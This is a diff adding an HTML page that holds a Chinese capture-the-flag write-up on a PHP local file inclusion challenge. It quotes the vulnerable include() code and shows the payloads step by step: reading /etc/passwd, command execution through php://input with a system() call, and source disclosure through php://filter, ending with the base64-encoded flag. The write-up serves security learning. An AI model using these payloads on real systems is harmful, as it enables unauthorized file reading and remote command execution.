@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ｄ.6- Include(本地文件包含)</title>
+    <style type="text/css" media="all">
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
+        font-size: 14px;
+        line-height: 20px;
+        color: #777;
+        background-color: white;
+      }
+      .container {
+        width: 700px;
+        margin-right: auto;
+        margin-left: auto;
+      }
+
+      .post {
+        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
+        position: relative;
+        padding: 70px;
+        bottom: 0;
+        overflow-y: auto;
+        font-size: 16px;
+        font-weight: normal;
+        line-height: 25px;
+        color: #515151;
+      }
+
+      .post h1{
+        font-size: 50px;
+        font-weight: 500;
+        line-height: 60px;
+        margin-bottom: 40px;
+        color: inherit;
+      }
+
+      .post p {
+        margin: 0 0 35px 0;
+      }
+
+      .post img {
+        border: 1px solid #D9D9D9;
+      }
+
+      .post a {
+        color: #28A1C5;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="post">
+        <h1 class="title">Ｄ.6- Include(本地文件包含)</h1>
+        <div class="show-content">
+          <p><a href="https://www.ichunqiu.com/battalion" target="_blank">题目：</a></p><p>题目指出了文件包含，于是看看源码，看来是include()函数导致文件包含。</p><p>题目链接如下，因为源码提示，如果接受到ｐａｔｈ参数，就包含ｐａｔｈ参数内容（本地文件），如果没接收到该参数，就包含phpinfo.php文件。</p><p>http://56ed22a560b04906a2655392b2d2fca7da6ac6021691428c.game.ichunqiu.com</p><blockquote>
+<p>show_source(__FILE__);</p>
+<p>if(isset(　$_REQUEST['path'])　){</p>
+<p>include(　$_REQUEST['path']　);</p>
+<p>}else{</p>
+<p>include('phpinfo.php');</p>
+<p>}</p>
+</blockquote><p>于是我在ＵＲＬ链接后加“?path=/etc/passwd”，顺利找到密码文件。。</p><p>接下来考虑，能否直接显示ｆｌａｇ　文件呢？但是我不知道ｆｌａｇ文件的路径。</p><hr><p>做一下信息搜集，phpinfo.php显示版本 5.6.29，nginx/1.10.2</p><p>allow_url_include，显示ｏｎ。据说php5.2之后默认为ｏｆｆ,　这算应用配置错误吗？</p><p>/var/<i>log</i>/<i>nginx/</i>access.<i>log</i></p><p>/var/log/httpd-access.log</p><p>/var/www/log/httpd-access.log  ,尝试找到日志文件来写入命令？但没找到正确的路径</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-0dc3040c10bf6407.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>http://php.net/manual/zh/wrappers.php.php　关于ｐｈｐ封装协议。</p><p>添加参数?path=php://input，并ｐｏｓｔ数据“&lt;?php system('ls');?&gt;”,显示</p><blockquote>
+<p>dle345aae.php</p>
+<p>index.php</p>
+<p>phpinfo.php</p>
+</blockquote><p><a href="https://www.jianshu.com/p/52a668889512" target="_blank">参考靶机实验</a>。。。path=php://filter/convert.base64-encode/resource=dle345aae.php</p><blockquote>
+<p>PD9waHAgCiRmbGFnPSJmbGFnezliYTE1NTA0LWEwNjgtNDg0Ny1hNmMzLTRiYzgz</p>
+<p>ZjBlMWYyY30iOwo=</p>
+</blockquote><p>base64解码以后获得ｆｌａｇ</p>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
